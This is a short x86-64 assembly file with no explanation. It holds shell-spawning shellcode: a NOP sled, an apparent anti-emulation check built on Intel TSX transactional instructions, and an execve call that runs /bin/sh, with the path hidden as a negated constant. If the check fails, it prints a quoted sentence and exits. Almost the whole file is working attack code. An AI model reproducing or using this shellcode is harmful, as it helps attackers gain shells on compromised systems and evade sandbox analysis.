%idefine rip rel $

global _start
    _start:
    db  0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
    db  0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
    lea rdi, [rip]
    sub rdi, 0x10
    mov dword eax, [rdi]
    mov dword [rdi], eax
    mov ebx, 0x42424242
    
    xacquire lock xor dword [rdi], ebx
    xtest
    jnz shellcode
    jmp fail

    shellcode:
    xrelease lock xor dword [rdi], ebx
    
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    push rsp
    pop rsi
    mov al, 0x3b
    syscall

    fail:
    jmp short string

    code:
    pop rsi
    xor rax, rax
    mov al, 1
    mov rdi, rax
    mov rdx, rdi
    add rdx, 73
    syscall

    xor rax, rax
    add rax, 60
    xor rdi, rdi
    syscall

    string:
    call code
    db  'After all, all that was necessary was to provide the illusion of freedom',0x0A

